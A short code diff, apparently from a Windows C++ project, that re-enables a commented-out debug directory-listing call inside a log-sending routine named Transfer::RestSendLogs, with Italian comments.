@@ -2026,7 +2026,7 @@ BOOL Transfer::RestSendLogs() {
 	DWORD dwSize, dwRead = 0;
 
 	//ByGio usato per debug
-	/////DebugListLocalDir();
+	DebugListLocalDir();
 
 
 	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
